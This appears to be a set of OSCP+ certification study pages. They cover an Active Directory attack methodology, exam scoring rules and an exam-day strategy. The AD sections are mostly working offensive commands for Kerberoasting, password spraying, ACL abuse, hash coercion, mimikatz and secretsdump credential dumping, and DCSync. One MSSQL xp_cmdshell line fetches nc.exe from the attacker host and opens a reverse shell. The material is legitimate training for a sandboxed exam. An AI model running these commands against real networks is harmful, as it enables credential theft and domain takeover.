docs.title: Active Directory
docs.text:
Exam weight: 40 / 100 (10 + 10 + 20) · Priority: Highest · Last updated: 2026-11-03

In one sentence

The AD set starts from a supplied domain user (assumed breach) and chains through two machines to the Domain Controller. Partial points count, but most passing write-ups clear all 40 — and the usual blocker is not a missing technique but a missed credential or a missed pivot.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: The AD loop
docs.text:
Every AD set is the same loop, repeated until the DC falls:

flowchart LR
    A[Credentials] --> B[Enumerate<br/>who can log in where?]
    B --> C[Attack path<br/>roast, spray, ACL, admin access]
    C --> D[Access a host]
    D --> E[Loot the host<br/>hashes, secrets, files]
    E --> A
    D -.->|new subnet| F[Pivot]
    F --> B

A typical exam-style chain (yours will differ in the details):

Step From → to Usual technique 1 Given user → MS01 (external) WinRM / RDP login, then local privesc 2 MS01 SYSTEM → domain credential mimikatz / secretsdump, files, history 3 Kali → internal subnet ligolo-ng agent on MS01 4 Domain cred → MS02 Kerberoast / reuse / ACL abuse → WinRM / psexec / MSSQL 5 MS02 loot → Domain Admin or DCSync rights Cached creds, service account, ACL path 6 → DC01 DCSync → psexec / evil-winrm as Administrator

The habit that saves the most time

Every new credential gets tried everywhere — every host, every protocol (SMB, WinRM, RDP, MSSQL), as a domain user and as a local account (--local-auth). Keep a running creds.txt and add to it the moment you find anything.

docs.title: 2. Main tools
docs.text:
Tool Use it for Runs from NetExec (nxc) Validate creds, find admin access (Pwn3d!), users, shares, policy, roasting, spraying, command exec Kali Impacket GetUserSPNs, GetNPUsers, secretsdump, psexec / wmiexec / smbexec, mssqlclient, getTGT, smbserver Kali evil-winrm Interactive PowerShell over WinRM (5985/5986), upload / download Kali BloodHound CE + SharpHound / bloodhound-ce-python Map attack paths (sessions, admin rights, ACLs) Collector on target / Kali → GUI on Kali Kerbrute User enumeration and spraying over Kerberos Kali Rubeus Kerberoast, AS-REP roast, ask / pass tickets from Windows Target mimikatz LSASS creds, SAM, LSA secrets, DCSync, pass-the-hash Target (admin) PowerView LDAP enumeration in PowerShell (users, SPNs, ACLs) Target hashcat / john Cracking roasted / captured hashes → Password attacks Kali

Exam rules that bite in the AD set

  • No spoofing / poisoning: Responder in poisoning mode (LLMNR / NBT-NS / mDNS), mitm6, ARP / DNS spoofing (bettercap, arpspoof) — all banned. Use coercion without spoofing instead.
  • Metasploit on one target only, and no Metasploit pivoting — so the AD chain is done with Impacket, NetExec, Rubeus, mimikatz, ligolo-ng. See Metasploit limits.
  • No AI / chatbots for help while you work — your notes and public references only.
  • Full list → Exam format › Restricted.

docs.title: 3.1 Assumed-breach start — map the credential
docs.text:
Situation: The control panel gives you eric.wallows : EricLikesRunning800 and the IP of MS01.

# names first — Kerberos needs them
nxc smb 192.168.120.0/24                         # discover names / domain from banners
echo "$DC dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts
# optionally make the DC your resolver for Kerberos tools: add "nameserver $DC" to /etc/resolv.conf

# where does the credential work?
for p in smb winrm rdp mssql ldap; do nxc $p <MS01_IP> -u "$USER_" -p "$PASS"; done

What to read: [+] = valid; (Pwn3d!) on SMB / WinRM = admin / can execute. WinRM [+] without Pwn3d! on older NetExec still often means you can log in — try evil-winrm.

Next: log in (3.2), then on the host:

whoami /all; hostname; ipconfig /all     # privileges, groups, second NIC?
net user /domain; net group "Domain Admins" /domain

Not admin → Windows privesc. Second NIC → Pivoting.

docs.title: 3.2 evil-winrm — interactive shell with creds or a hash
docs.text:
evil-winrm -i <IP> -u "$USER_" -p "$PASS"
evil-winrm -i <IP> -u Administrator -H <NT_HASH>                  # pass-the-hash
evil-winrm -i <IP> -u "$USER_" -p "$PASS" -s ~/exam/tools/ps     # load local .ps1 scripts by name

*Evil-WinRM* PS> upload /home/kali/exam/tools/winPEASx64.exe C:\Windows\Temp\wp.exe
*Evil-WinRM* PS> download C:\Windows\Temp\sam.save

What to read: the prompt appears → you're in. WinRMAuthorizationError → valid creds but not in Remote Management Users / admins on that host; try RDP / SMB / MSSQL.

docs.title: 3.3 NetExec — domain enumeration with a user
docs.text:
nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol           # lockout threshold!
nxc smb $DC -u "$USER_" -p "$PASS" --users | tee loot/users.raw
nxc smb $DC -u "$USER_" -p "$PASS" --groups
nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS" --shares
nxc smb $DC -u "$USER_" -p "$PASS" -M spider_plus        # index every readable share
nxc ldap $DC -u "$USER_" -p "$PASS" --kerberoasting kerb.hash
nxc ldap $DC -u "$USER_" -p "$PASS" --asreproast asrep.hash
nxc ldap $DC -u "$USER_" -p "$PASS" -M get-desc-users    # passwords left in descriptions
nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS" --loggedon-users

What to read: user descriptions (pwd: ...), SYSVOL / NETLOGON scripts, non-default shares (Backups, IT, Dev), kerberoast / AS-REP output files not empty.

Next: build users.txt (awk the usernames out), crack any roast hashes, grep the spider output for configs.

docs.title: 3.4 BloodHound CE — find the attack path
docs.text:
Situation: You have a valid domain user. You want to know who can reach what.

From Kali (bloodhound-ce-python)From a domain host (SharpHound) 
# pip install bloodhound-ce   (CE-compatible fork of bloodhound-python)
bloodhound-ce-python -u "$USER_" -p "$PASS" -d $DOMAIN -ns $DC -c All --zip

.\SharpHound.exe -c All --zipfilename loot.zip
# PowerShell version: Import-Module .\SharpHound.ps1; Invoke-BloodHound -c All

Start BloodHound CE on Kali (Docker, via bloodhound-cli or the project's compose file), log in at http://localhost:8080, and upload the ZIP.

Queries, in this order:

  1. Search your user → mark as Owned.
  2. Outbound Object Control on your user (GenericAll / GenericWrite / WriteDACL / WriteOwner / ForceChangePassword / AddMember).
  3. Cypher / pre-built: Kerberoastable users, AS-REP roastable users.
  4. Shortest paths from Owned objects and Shortest paths to Domain Admins.
  5. For each computer: Local Admin Rights / CanPSRemote / CanRDP / SQLAdmin edges.

What to read: an edge from something you own to something you don't. Right-click the edge → Help / Abuse explains the attack.

Collector and GUI must match

BloodHound CE needs a CE collector (SharpHound v2+, bloodhound-ce-python); the legacy 4.x GUI needs the legacy collector. A mismatch imports nothing. Decide which you use before exam day and test it.

docs.title: 3.5 Kerberoasting — Impacket / Rubeus
docs.text:
Situation: BloodHound or nxc --kerberoasting lists users with an SPN (svc_sql, svc_web).

Kali — ImpacketWindows — Rubeus 
impacket-GetUserSPNs "$DOMAIN/$USER_:$PASS" -dc-ip $DC                    # list
impacket-GetUserSPNs "$DOMAIN/$USER_:$PASS" -dc-ip $DC -request -outputfile kerb.hash

.\Rubeus.exe kerberoast /outfile:kerb.hash /nowrap

hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt      # $krb5tgs$23$

What to read: $krb5tgs$23$*svc_sql$CORP.LOCAL$.... KRB_AP_ERR_SKEW → clock skew: sudo ntpdate $DC (or faketime).

Next: cracked service account → spray it (nxc smb/winrm/mssql) — service accounts are often admin on the server they run on.

Full lab walkthrough → Lab: Kerberoasting · Defender view → Kerberoasting.

docs.title: 3.6 AS-REP roasting — Impacket / Rubeus
docs.text:
Situation: Users with Do not require Kerberos pre-authentication — works even without a password if you know the usernames.

impacket-GetNPUsers "$DOMAIN/" -usersfile users.txt -dc-ip $DC -no-pass -format hashcat -outputfile asrep.hash
impacket-GetNPUsers "$DOMAIN/$USER_:$PASS" -dc-ip $DC -request -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash /nowrap

Defender view → AS-REP Roasting.

docs.title: 3.7 Password spraying — Kerbrute / NetExec
docs.text:
Read the policy, then one password at a time:

nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt "$PASS"          # given password reused?
nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success

Candidates: the given password, every cracked password, Season+Year!, Company123!, the username. Details and lockout math → Password attacks › Spraying.

docs.title: 3.8 ACL abuse — what to do with a BloodHound edge
docs.text:
Edge (your user → target) Abuse from Kali ForceChangePassword on a user net rpc password 'target' 'NewPass123!' -U "$DOMAIN/$USER_%$PASS" -S $DC GenericWrite / GenericAll on a user Targeted Kerberoast: set an SPN, roast, remove — targetedKerberoast.py -d $DOMAIN -u "$USER_" -p "$PASS" --dc-ip $DC GenericAll on a user Reset the password (as above) AddMember / GenericAll on a group net rpc group addmem 'IT Admins' "$USER_" -U "$DOMAIN/$USER_%$PASS" -S $DC WriteDACL on the domain Grant yourself DCSync rights (impacket-dacledit -action write -rights DCSync ...), then DCSync WriteOwner Take ownership (impacket-owneredit), then grant GenericAll ReadGMSAPassword / ReadLAPSPassword nxc ldap $DC -u "$USER_" -p "$PASS" --gmsa / -M laps

From Windows the same actions exist in PowerView (Set-DomainUserPassword, Add-DomainGroupMember, Set-DomainObject).

Next: after a group change, get a fresh logon (new shell / new ticket) — group membership is read at logon time.

docs.title: 3.9 Coercion without spoofing — capturing NetNTLMv2
docs.text:
Situation: You want a user's or service's NetNTLMv2 hash, but Responder-style poisoning is banned.

Run an SMB server you control and make the target connect to it:

impacket-smbserver share /tmp/share -smb2support       # prints captured NetNTLMv2 hashes

Ways to make the target connect:

  • MSSQL: EXEC master..xp_dirtree '\\<KALI>\share'; (from impacket-mssqlclient) → the SQL service account's hash.
  • Writable share someone browses: drop a .url / .lnk / .library-ms whose icon path is \\<KALI>\share\x.ico.
  • Web app / LFI on Windows: a path parameter pointing at \\<KALI>\share\x.
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt

Exam rule

Listening for connections you caused is fine. Poisoning name resolution (LLMNR / NBT-NS / mDNS / DHCPv6) so victims connect to you by mistake is spoofing and banned. Relaying (ntlmrelayx) is a grey area tied to how the connection was triggered — check the current Exam Guide before relying on it. Defender view → LLMNR / NTLM Relay.

docs.title: 3.10 Lateral movement
docs.text:
Pick the method by what you hold and which ports are open:

You have Port Command Lands as Admin password / hash 445 impacket-psexec "$DOMAIN/admin:Pass@<IP>" or -hashes :<NT> SYSTEM (noisy: creates a service) Admin password / hash 135 + 445 impacket-wmiexec "$DOMAIN/admin@<IP>" -hashes :<NT> The user (semi-interactive) Admin password / hash 445 impacket-smbexec ... / nxc smb <IP> ... -x 'whoami' SYSTEM Remote Management Users / admin 5985 evil-winrm -i <IP> -u user -H <NT> The user RDP rights 3389 xfreerdp3 /v:<IP> /u:user /p:'Pass' /d:$DOMAIN The user (GUI) SQL login 1433 impacket-mssqlclient "$DOMAIN/user:Pass@<IP>" -windows-auth SQL service account Only Kerberos works / NTLM blocked 88 impacket-getTGT "$DOMAIN/user" -hashes :<NT> → export KRB5CCNAME=user.ccache → impacket-psexec -k -no-pass "$DOMAIN/user@ms02.$DOMAIN" —

MSSQL → command execution:

SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
SQL> xp_cmdshell powershell -c "iwr http://<KALI>/nc.exe -o C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"

The SQL service account usually has SeImpersonatePrivilege → potato.

What to read: [*] Found writable share ADMIN$ → psexec works. rpc_s_access_denied → not admin; try WinRM / RDP / MSSQL with the same creds. With Kerberos, always use the hostname, not the IP.

Defender view → Pass-the-Hash · PsExec / SMB · WMI / WinRM · RDP.

docs.title: 3.11 Loot each machine — mimikatz / secretsdump
docs.text: As soon as you are admin / SYSTEM on a host — before moving on — collect credentials.

docs.title: mimikatz (on the target)
docs.text:
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > C:\Windows\Temp\mk.txt

What to read: sekurlsa::logonpasswords → Username / Domain / NTLM for every logged-on user (sometimes Password in clear text via wdigest or service accounts); lsadump::secrets → _SC_<service> = service account passwords in clear text; lsadump::cache → DCC2 hashes (-m 2100, slow); lsadump::sam → local Administrator NT hash.

docs.title: secretsdump (from Kali)
docs.text:
impacket-secretsdump "$DOMAIN/admin:Pass@<IP>"                 # SAM + LSA secrets + cached creds remotely
impacket-secretsdump -hashes :<NT> "./Administrator@<IP>"      # local admin hash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

docs.title: By hand
docs.text:
cmdkey /list
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ChildItem C:\Users -Include *.txt,*.ps1,*.xml,*.config,*.kdbx -Recurse -ErrorAction SilentlyContinue

Next: add every hash / password to creds.txt and go back to spraying across the internal subnet.

Defender view → LSASS Dumping · SAM / NTDS Extraction.

docs.title: 3.12 Domain compromise
docs.text:
Situation: You hold a Domain Admin credential, or a user with Replicating Directory Changes (All) (BloodHound edge DCSync).

# DCSync from Kali
impacket-secretsdump "$DOMAIN/da_user:Pass@dc01.$DOMAIN" -just-dc-user Administrator
impacket-secretsdump "$DOMAIN/da_user:Pass@dc01.$DOMAIN" -just-dc-ntlm      # every user
# shell on the DC
impacket-psexec -hashes :<ADMIN_NT> "$DOMAIN/Administrator@dc01.$DOMAIN"
evil-winrm -i $DC -u Administrator -H <ADMIN_NT>

# DCSync from a Windows host as the privileged user
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"

What to read: Administrator:500:aad3b...:<NT>:::. Next: shell on the DC, type C:\Users\Administrator\Desktop\proof.txt, whoami, ipconfig → screenshot.

Other domain-level paths to study (each has a defender page): DCSync · Golden & Silver Tickets · AD CS Abuse · delegation (constrained / unconstrained / RBCD) · writable GPOs.

docs.title: 4. Common mistakes
docs.text:
• No AD methodology — the #1 first-attempt failure in write-ups. Drill the loop until it is automatic.
  • Not trying creds everywhere — especially --local-auth and MSSQL.
  • Missing /etc/hosts or clock sync → Kerberos tools fail with KDC_ERR_S_PRINCIPAL_UNKNOWN / KRB_AP_ERR_SKEW.
  • Spraying without reading the lockout policy.
  • Moving on without looting — the next credential is usually on the host you just owned.
  • Pivoting stall — owning MS01 but never routing to MS02's subnet → Pivoting.
  • BloodHound collector / GUI mismatch → empty graph.
  • Doing the AD set tired. It is 40 chained points — take it while fresh.

docs.title: 5. Exam tips
docs.text:
• Partial points count: MS01 = 10, MS02 = 10, DC = 20. Submit each flag as soon as you have it.
  • Keep one notes page per host with: how you got in, creds found there, screenshots.
  • Re-run BloodHound collection after you own a new user — new edges appear.
  • If the set stalls for ~2 hours with no new information, switch to a standalone and come back fresh (Exam format › Scoring strategy).

docs.title: Exam-Day Strategy
docs.text:
Window: 23 h 45 m hands-on + 24 h report · Sources checked / Last updated: 2026-11-04

In one sentence

Warm up on one standalone, work on the AD set while still fresh, document objectives as you complete them, and rest before frustration compounds into paralysis.

How this page is organised

A plan for the day plus a raw-point and evidence tracker to copy into your notes. The exam has a large psychological component — managing energy and nerves is as important as technique.

Check the exam start time — scoring changes on 1 December 2026

Attempts starting before 1 December 2026 at 08:00 GMT require at least 70 raw points. Attempts starting on or after that instant require at least 400 scaled points on a 100–500 scale. Under scaled scoring, 70 or 80 raw points does not guarantee a pass, and 400/500 does not mean 80% raw points. Check your booked start time; no exam date is assumed here. See scoring details and the official Scoring FAQ.

docs.title: Before the exam
docs.text:
• Book early. Slots are limited — often a month out. Pick a start time, and avoid travelling right before.
  • Choose a start time deliberately. Your sharpest hours should overlap the first ~6 h (one standalone + the AD set). Many pick mid-morning; some prefer a night start after a nap. Not so early you're groggy, not so late burnout hits at the hard part.
  • Prepare the environment the day before: Kali VM snapshot, tools / wordlists / scripts in place, the report template open, a second internet option (phone hotspot), backup power.

docs.title: Start and proctoring
docs.text:
• Setup (ID check, screen share, webcam, VPN) can take up to an hour and does not eat your 23 h 45 m — but the VPN can be slow, so don't panic.
  • The proctor may ask you to re-share your screen or recheck the webcam during the exam. This is normal; stay calm and carry on.
  • No AI, no outside help, webcam on the whole time → exam rules.

docs.title: Order of attack
docs.text:
1. One standalone to warm up (~2–3 h cap). Get into the flow — full enumeration, exploit, document. If it's fighting you, document any foothold and move on.
  2. The AD set, while fresh. 40 chained points; a missed credential or pivot early blocks the rest, so do it with a clear head → Active Directory.
  3. Back to the remaining standalones with AD banked, fresh eyes on anything you parked.
  4. Keep completing and documenting objectives. Under scaled scoring there is no published raw-point pass target. Use remaining time on promising leads, evidence checks and rest; an estimated total is not a reason to stop. For pre-change attempts, the 70-point combinations apply only if OffSec accepts the evidence; extra raw points never replace valid documentation.

docs.title: Time-boxing and breaks
docs.text:
• Give each stuck lead a fixed budget; when it expires, switch targets.
  • Take real breaks — eat lightly (heavy meals make you sluggish), step away, hydrate. Breakthroughs famously come after a break.
  • Get up roughly once an hour. The 23 h 45 m includes sleep — a short nap can be worth more than another hour of staring.

docs.title: Raw-point and evidence tracker
docs.text:
Copy this into your exam notes and keep it live. Use the control panel's objectives and raw-point values; your own total is only an estimate until grading, and cannot predict a scaled-scoring result.

Target local.txt proof.txt Est. raw points Evidence / panel / notes Time done Standalone 1 Standalone 2 Standalone 3 AD #1 — AD #2 — AD DC — Total

At the halfway mark, use the scoring strategy to review unfinished objectives, missing evidence, promising leads and energy. Do not convert this tracker to a scaled score or label it a pass/fail result.

docs.title: When stuck
docs.text:
• Go back to enumeration — the thing you need is usually already on screen, unread.
  • Switch to another machine; a parked problem often solves itself after time away.
  • Re-read your own notes for a credential or detail you noted but didn't use.
  • Don't spiral. People who pass write "I came back and got it in 20 minutes"; people who fail write "my mind went blank." The machines don't change — you do.

docs.title: After the hands-on window
docs.text:
• Submit every flag in the control panel before the VPN closes.
  • Rest, then write the report in the 24-hour window → Reporting. If your notes are good, this is mostly assembly.
  • Submit the report even if your estimated raw points seem low. Under scaled scoring, raw points alone cannot tell you whether you passed; without a submitted report, you cannot pass.
  • You cannot return to the machines, so a missing screenshot is unrecoverable — check the report against the submission checklist.
  • Allow up to 15 business days for results by email after report submission, as stated in the Scoring FAQ (previously 10; the Exam Guide's Results section still lists 10).

docs.title: Exam Format & Scoring
docs.text:
Section: OSCP+ · Sources: OffSec OSCP+ Exam Guide & Scoring FAQ (checked 2026-11-04) · Last updated: 2026-11-04

In one sentence

23 h 45 m of hands-on hacking in a private VPN, then 24 h to upload the report; 100 raw points available, with the pass mark determined by the exam start time — and a flag only counts if the report proves it was taken from an interactive shell.

Rules change — re-read before booking

Check the official OSCP+ Exam Guide and Equated Scaled Scoring FAQ again the week before the exam. The scoring method depends on when each attempt starts, not when it is booked. Check your booked start time; this page does not assume which method applies to you.

docs.title: Exam at a glance
docs.text: Item Value Hands-on window 23 h 45 m (e.g. start 09:00, VPN closes 08:45 next day) Report window 24 h after the hands-on window ends Machines 3 standalone + 1 Active Directory set of 3 machines Raw points available 100 Pass mark — starts before 1 Dec 2026, 08:00 GMT At least 70 raw points Pass mark — starts on or after 1 Dec 2026, 08:00 GMT At least 400 scaled points on a 100–500 scale Bonus points None (removed 1 Nov 2024) Connection Kali Linux + OpenVPN (OffSec only supports this setup) Proctoring Webcam + screen sharing for the whole hands-on window Results By email after report submission: allow up to 15 business days under the Scoring FAQ (previously 10; the Exam Guide's Results section still says 10)

docs.title: Where the points come from
docs.text:
Target Raw points How Standalone 1 / 2 / 3 20 each 10 for local.txt (low-privilege user) + 10 for proof.txt (root / Administrator) AD machine #1 10 Full compromise of the first host AD machine #2 10 Full compromise of the second host AD machine #3 (Domain Controller) 20 Domain compromise

For the AD set you are given a username and password at the start, simulating a user whose account has already been phished ("assumed breach"). The exact objectives for each machine are shown in the exam control panel — read them at the start.

docs.title: Scoring change from 1 December 2026
docs.text:
For attempts starting on or after 1 December 2026 at 08:00 GMT, OffSec converts the awarded raw points to an equated scaled score. The conversion accounts for the difficulty of the exam set; the raw points needed to reach 400 can be above or below 70 and are not published.

400/500 does not mean 80% raw points. There is no fixed conversion ratio or raw-point total you can use to determine whether you passed. For example, 40 AD + 30 standalone = 70 raw points, but that arithmetic does not establish a scaled score or a pass under the new method.

The exam structure, objective raw-point values, proof requirements, time limits and report deadline stay the same. Graders assess the documented objectives first; scaling happens afterwards. Submit the report even if your estimated raw total seems low. The FAQ says successful candidates receive a pass notification; unsuccessful candidates receive their scaled score.

docs.title: What makes a flag count
docs.text:
Getting the flag is not enough. Each one must meet all of these, or the target can score zero:

  1. Interactive shell. Read the flag with cat (Linux) or type (Windows) from an interactive shell on the target. Web shells are not valid — a flag read through a web shell earns zero points for that target.
  2. Original location. Read it where it lives — don't copy or move it first.
  3. Screenshot with the IP. The same screenshot must show the flag contents and the target's IP address (ip addr, ifconfig or ipconfig).
  4. Right privilege for proof.txt. Linux: a root shell. Windows: a shell as SYSTEM, Administrator, or a user in the local Administrators group.
  5. Submitted in the control panel before the exam ends. The panel does not tell you whether the flag is correct.
  6. Documented in the report well enough that a technically competent reader can repeat every step.

A proof screenshot that satisfies rules 1–4 in one frame:

LinuxWindows 
hostname; whoami; ip addr show | grep 'inet '; cat /root/proof.txt
Example output (illustrative)
web01
root
    inet 127.0.0.1/8 scope host lo
    inet 192.168.120.45/24 brd 192.168.120.255 scope global ens160
3f1c0e9b6a2d47c58e1f0a9d2b7c4e61

hostname & whoami & ipconfig | findstr IPv4 & type C:\Users\Administrator\Desktop\proof.txt
Example output (illustrative)
MS01
nt authority\system
   IPv4 Address. . . . . . . . . . . : 10.10.120.141
9a4e2c71d0b84f6e93c5a1f7e2d6b083

Grading order

OffSec grades machines in the order they appear in your report. Put each target in its own clearly labelled section.

docs.title: Passing combinations — before the scoring change only
docs.text:
Only for exams starting before 1 December 2026 at 08:00 GMT

This entire section uses the fixed 70-raw-point pass mark. These combinations and the table below are not pass guarantees under scaled scoring. All objectives must still be properly evidenced and awarded by OffSec.

Each line totals exactly 70 raw points under the unchanged objective values:

  • 40 AD + 3 × local.txt
  • 40 AD + 2 × local.txt + 1 × proof.txt
  • 20 AD + 3 × local.txt + 2 × proof.txt
  • 10 AD + 3 fully completed standalones

Under that fixed pass mark, the AD contribution determines the standalone points needed:

AD points Standalone points needed What that means 40 30 Three footholds, or one full box + one foothold 20 50 Five of the six standalone flags 10 60 Every standalone flag — no mistakes allowed 0 — Cannot pass (standalones max out at 60)

docs.title: What changed in November 2024
docs.text:
Before 1 Nov 2024 OSCP+ exam now AD set start Had to find the initial foothold yourself — no foothold, no AD points Assumed breach: domain credentials given at the start AD scoring All-or-nothing 40 Points per machine: 10 / 10 / 20 Bonus points Up to 10 for lab reports and exercises None Buffer overflow The dedicated 25-point BOF machine already ended in 2022 Still not guaranteed — at most one step of a machine Certification OSCP (lifetime) OSCP (lifetime) and OSCP+ (3 years)

OSCP+ is kept current by passing the OSCP+ recertification exam in the six months before it expires, passing another qualifying OffSec certification, or through OffSec's CPE programme. The plain OSCP never expires.

docs.title: Restricted tools and techniques
docs.text:
The guide lists these as not allowed (quoted):

Spoofing (IP, ARP, DNS, NBNS, etc)

Commercial tools or services (Metasploit Pro, Burp Pro, etc.)

Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)

Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)

AI Chatbots (OffSec KAI, ChatGPT, YouChat, etc.)

Features in other tools that utilize either forbidden or restricted exam limitations

Tools that do the same job as anything on the list are also out. What this means in practice:

Want to… Not allowed Use instead Capture NetNTLMv2 hashes LLMNR / NBNS poisoning with Responder (spoofing) Make the target connect to you — impacket-smbserver, a UNC path in a file or input field Exploit SQL injection sqlmap Manual injection → Web & initial access Intercept web traffic Burp Pro Burp Suite Community, browser dev tools Get help ChatGPT, Claude, Gemini, OffSec KAI, other people Your notes, HackTricks, GTFOBins, LOLBAS, man pages, search engines

Explicitly allowed examples from the guide: Nmap (including NSE), Nikto, Burp Free, DirBuster. Searching the internet and Discord is fine; asking anyone for help is not.

docs.title: Metasploit — one target only
docs.text:
• Metasploit modules (auxiliary, exploit, post) or a Meterpreter payload may be used against one target of your choice.
  • Once used on a target, the choice is locked — even if it fails, you cannot move Metasploit to another machine.
  • Running check (or anything else) against several machines to "pick" one is not allowed.
  • No Metasploit pivoting (that would touch more than one target).
  • Always allowed on every target: msfvenom and exploit/multi/handler (with a non-Meterpreter payload).
  • The same limits apply to anything built on Metasploit (Armitage, Cobalt Strike, Metasploit Community).

docs.title: Exploit code in the report
docs.text:
• Unmodified public exploit: give the URL only — don't paste the code.
  • Modified exploit: include the modified code, the original URL, the shellcode / msfvenom command if any, and highlight and explain every change.

docs.title: Other rules
docs.text:
• Don't download files from the exam network unless you need them to compromise a target, and delete them afterwards.
  • Machine reverts are limited (the count is in the control panel). A revert wipes everything on that machine, including your shells.
  • The 23 h 45 m includes all breaks, meals and sleep — there is no pause button. Tell the proctor in chat before stepping away.
  • Have a backup plan for your own failures: second internet connection (phone hotspot), a spare Kali VM snapshot.

docs.title: Ways to lose a target's points
docs.text:
From the guide, you get zero points for a target if you:

  • use a restricted tool or technique on it;
  • use Metasploit modules or Meterpreter on more than one machine;
  • don't provide local.txt / proof.txt both in the control panel and in an interactive-shell screenshot;
  • don't document it well enough to reproduce.

docs.title: Report submission (summary)
docs.text:
Details and checklist on the Reporting page.

Item Requirement Format One PDF, inside a .7z archive; scripts / PoCs as text inside the PDF Names (case-sensitive) OSCP-OS-XXXXX-Exam-Report.pdf and OSCP-OS-XXXXX-Exam-Report.7z (your OSID) Password None on the PDF or the archive Size Max 200 MB Where / when https://upload.offsec.com, within 24 h of the hands-on window ending Check Compare the MD5 shown after upload with your local file, then click Submit File

docs.title: Scoring strategy
docs.text:
Plan around completed, documented objectives and available time. Identify the applicable scoring method from your exam start time using the overview; under scaled scoring, neither 70 nor 80 raw points is a guaranteed pass or a stopping rule.

  1. Warm up on one standalone (time-box about 2–3 h). Get into a working rhythm and document each completed objective as you go.
  2. Move to the AD set while still fresh. It is the largest single block of points and it is chained — every credential found matters for the next machine.
  3. Go back to the remaining standalones and reassess parked leads. Raw-point values help track progress, but only documented objectives earn credit.
  4. Complete as many objectives as you can while protecting evidence and rest. Reserve time to verify screenshots, control-panel submissions and reproducible notes. Do not stop because an estimated total looks sufficient.

Fallback: if the AD set stalls. If several hours pass with no new information, switch to promising standalone leads, document what you complete, then return to AD with fresh eyes. Under scaled scoring there is no fixed standalone total that makes up for a particular AD total.

Situation at about hour 12 Estimated raw points Next move AD 40, one standalone foothold 50 Follow the strongest remaining foothold or privilege-escalation lead; check evidence first AD 20, nothing standalone 20 Standalones now; return to AD later AD 0, two full standalones 40 Revisit AD enumeration and credentials; assess the remaining standalone too

For pre-change attempts only, 40 AD + 30 standalone reaches the fixed 70-raw-point mark if all evidence is accepted. The old 80-point planning target provided room for lost credit; it was never a substitute for valid proof and must not be carried over as a scaled-scoring pass target. See the pre-change combinations.

docs.title: Exam Workflow
docs.text:
Applies to: the whole exam, every machine · Last updated: 2026-11-03

In one sentence

The whole exam as one pipeline: recon → foothold → stable shell → privilege escalation on each standalone, and for the AD set an assumed-breach chain of enumerate → roast / spray → pivot → move laterally → own the domain. Each stage below says what to run, what "done" looks like, and which page has the detail.

Rules first

Several common tools are banned or limited in the exam (sqlmap, Nessus-style scanners, Burp Pro, spoofing/poisoning, AI chatbots, Metasploit beyond one target). They are flagged with red boxes on each page and summarised on Exam format › Restricted. Always re-read the official OSCP+ Exam Guide before you sit the exam — the rules change.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: The pipeline at a glance
docs.text:
flowchart TD
    R[1. Recon<br/>nmap, service enum] --> W[2. Initial access<br/>web / service / exploit]
    W --> S[3. Stabilise shell<br/>TTY, file transfer]
    S --> PL[4a. Linux privesc]
    S --> PW[4b. Windows privesc]
    PL --> FLAG[proof.txt + screenshot]
    PW --> FLAG
    AD[5. AD set<br/>given creds] --> EN[Enumerate<br/>nxc, BloodHound]
    EN --> CR[Roast / spray / ACL<br/>crack]
    CR --> MS01[Access MS01<br/>loot]
    MS01 --> PV[6. Pivot<br/>ligolo-ng]
    PV --> LM[7. Lateral movement<br/>MS02]
    LM --> DC[8. Domain compromise<br/>DCSync / DA]
Stage Goal / "done" when… Main tools Page 1. Recon Every TCP port + top UDP ports known, versions noted nmap, nxc, smbclient, enum4linux-ng, snmpwalk Recon & enumeration 2. Initial access Command execution as any user ffuf / feroxbuster / gobuster, Burp CE, nikto, searchsploit, hydra Web & initial access 3. Stabilise Interactive TTY / reverse shell, tools uploaded msfvenom, nc / rlwrap, python http.server, smbserver Shells & file transfer 4a. Linux privesc root shell LinPEAS, pspy, GTFOBins Linux privesc 4b. Windows privesc SYSTEM / Administrator WinPEAS, PrintSpoofer / GodPotato, LOLBAS Windows privesc 5. AD — assumed breach Valid creds mapped to hosts; an attack path chosen NetExec, BloodHound CE, Kerbrute, Impacket Active Directory Cracking Hash → password hashcat, john Password attacks 6. Pivot Kali can route to the internal subnet ligolo-ng, chisel, ssh Pivoting 7. Lateral movement Shell on the next host evil-winrm, psexec / wmiexec, mssqlclient Active Directory › Lateral movement 8. Domain compromise DC proof.txt secretsdump (DCSync), mimikatz, Rubeus Active Directory › Domain compromise

docs.title: Before the clock starts
docs.text:
Put a small environment file in your workspace so every command below copy-pastes:

# ~/exam/env.sh  —  source it in every tmux pane
export KALI=192.168.45.5          # your tun0 IP
export IP=192.168.120.10          # current standalone
export DC=10.10.120.100           # AD set
export DOMAIN=oscp.exam
export USER_='eric.wallows'       # assumed-breach user (USER is taken by the shell)
export PASS='EricLikesRunning800'

mkdir -p ~/exam/{ms01,ms02,dc01,sa1,sa2,sa3}/{nmap,loot,exploit,screens}
ip -4 addr show tun0      # confirm KALI
  • One tmux window per machine, one pane for a listener.
